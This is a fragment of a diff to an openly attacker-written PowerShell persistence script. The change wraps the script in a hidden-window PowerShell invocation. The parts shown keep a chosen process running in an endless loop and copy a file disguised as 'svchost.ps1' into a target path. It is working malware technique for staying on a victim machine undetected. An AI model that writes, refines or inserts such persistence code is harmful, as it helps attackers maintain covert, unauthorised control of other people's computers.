@@ -1,3 +1,4 @@
+PowerShell.exe -windowstyle hidden {
 #attacker defined variables
 $dirofscript = "relative path to dir of the script"
 $persist = "process to persist"
@@ -16,4 +17,5 @@ while(1 -eq 1){$open = Get-Process $persist -ErrorAction SilentlyContinue
 if($pathtest -eq $false){
 copy svchost.ps1 $path -ErrorAction SilentlyContinue} 
 if ($open -eq $null){start $persist}  
+}
 }
